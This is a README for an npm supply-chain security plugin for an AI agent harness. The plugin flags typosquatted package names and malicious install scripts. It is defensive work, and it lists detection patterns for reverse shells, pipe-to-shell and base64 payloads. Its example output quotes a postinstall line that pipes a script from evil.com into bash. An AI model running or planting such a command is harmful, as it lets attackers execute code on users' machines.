# 🛡️ dsh-plugin-npm-guard

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![DSH Compatibility](https://img.shields.io/badge/DeepSeek%20Harness-Plugin-blue.svg)](https://github.com/deepseek-ai/dsh)

**NPM Supply-Chain Security & Typosquatting Guard for DeepSeek Harness (DSH).**

When autonomous AI agents write and execute code, installing npm dependencies without human verification introduces critical security vectors: **typosquatting** (hallucinated package names that match malware) and **malicious lifecycle scripts** (`postinstall` executing reverse shells or data exfiltration).

`dsh-plugin-npm-guard` equips DeepSeek Harness with an automated gatekeeper tool (`npm_security_audit`) that analyzes package names and `package.json` scripts before installation.

---

## ✨ Features

- **🎯 Levenshtein Typosquatting Detection**:
  - Compares candidate package names against the top 30+ most targeted npm packages (`express`, `react`, `lodash`, `axios`, `typescript`, `webpack`, `dotenv`, etc.).
  - Alerts the agent when a distance of 1 is detected on names longer than 3 characters (e.g., `exxpress`, `lodsh`, `reacct`).
- **🔍 Malicious AST & Script Pattern Matching**:
  - Scans `package.json` scripts (`preinstall`, `install`, `postinstall`, etc.) for known malware patterns:
    - 🚨 Remote execution via pipe-to-shell (`curl | bash`, `wget | sh`).
    - 🚨 Native Bash & Netcat reverse shells (`/dev/tcp/...`, `nc -e`).
    - 🚨 Obfuscated payloads decoded with `base64 -d`.
    - ⚠️ Dynamic `eval()` or suspicious environment secret reads.
- **⚡ Cordis Tool Registration**:
  - Exposes the tool `npm_security_audit` directly to the model.

---

## 🛠️ Tool Schema: `npm_security_audit`

```json
{
  "name": "npm_security_audit",
  "description": "Audit a package.json or npm package name for security vulnerabilities, malicious scripts, and typosquatting.",
  "parameters": {
    "package_name": {
      "type": "string",
      "required": false,
      "description": "NPM package name to verify against typosquatting"
    },
    "target_path": {
      "type": "string",
      "required": false,
      "description": "Path to package.json file to audit"
    }
  }
}
```

### Example Tool Output

```json
{
  "safe": false,
  "typosquatting": [
    {
      "suspicious": "exxpress",
      "target_popular": "express",
      "distance": 1,
      "warning": "ATTENZIONE: Il pacchetto 'exxpress' è quasi identico al popolare pacchetto 'express'. Possibile attacco di Typosquatting!"
    }
  ],
  "script_risks": [
    {
      "script_name": "postinstall",
      "command": "curl -s http://evil.com/setup.sh | bash",
      "findings": [
        {
          "severity": "CRITICAL",
          "description": "Esecuzione remota pipe-to-shell (curl | bash)"
        }
      ]
    }
  ]
}
```

---

## 📦 Installation in DeepSeek Harness

### 1. Via DSH CLI
```bash
dsh plugin --profile web add dsh-plugin-npm-guard
```

### 2. In Docker (`entrypoint.sh`)
```bash
ln -sfn /home/node/plugins/dsh-plugin-npm-guard /workspace/node_modules/dsh-plugin-npm-guard
dsh plugin --profile web add -w /home/node/plugins/dsh-plugin-npm-guard
```

---

## 🧪 Testing

```bash
npm test
```

---

## 📄 License

MIT © [Bebbolus](https://github.com/Bebbolus)
